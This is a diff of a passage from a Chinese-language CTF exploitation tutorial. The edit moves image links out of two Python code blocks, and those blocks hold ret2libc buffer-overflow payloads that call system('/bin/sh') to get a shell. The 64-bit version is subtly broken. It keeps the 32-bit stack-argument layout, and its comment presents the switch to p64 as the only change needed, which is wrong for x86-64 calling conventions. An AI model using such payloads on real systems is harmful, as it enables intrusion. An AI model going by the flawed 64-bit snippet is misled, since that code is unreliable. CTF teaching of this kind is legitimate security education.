@@ -108,17 +108,20 @@ EXP是Exploit的缩写，指用于利用软件漏洞的脚本或程序。在CTF 
 ![](img/ad074c72052999552b70a9529b30c63e_19.png)
 
 原始EXP关键部分可能如下：
+
+![](img/ad074c72052999552b70a9529b30c63e_21.png)
+
 ```python
 offset = 72
 system_addr = 0xf7e13660
 binsh_addr = 0xf7f5f0d5
-
-![](img/ad074c72052999552b70a9529b30c63e_21.png)
-
 payload = b'A' * offset + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
 ```
 
 经过分析新题目后，我们修改为：
+
+![](img/ad074c72052999552b70a9529b30c63e_23.png)
+
 ```python
 # 新计算的偏移是 88
 offset = 88
@@ -126,9 +129,6 @@ offset = 88
 system_addr = libc_base + 0x52290
 # 在libc中找到的"/bin/sh"字符串地址
 binsh_addr = libc_base + 0x1d8698
-
-![](img/ad074c72052999552b70a9529b30c63e_23.png)
-
 payload = b'A' * offset + p64(system_addr) + p64(0) + p64(binsh_addr) # 注意变为64位，使用p64
 ```
 
